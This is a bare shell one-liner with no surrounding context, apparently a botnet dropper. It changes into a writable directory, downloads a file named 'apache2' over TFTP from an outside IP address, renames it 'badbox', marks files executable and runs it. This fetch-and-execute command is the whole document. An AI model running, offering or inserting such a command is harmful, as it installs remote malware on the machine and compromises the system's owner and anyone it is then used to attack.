cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 192.227.180.164;cat apache2 >badbox;chmod +x *;./badbox
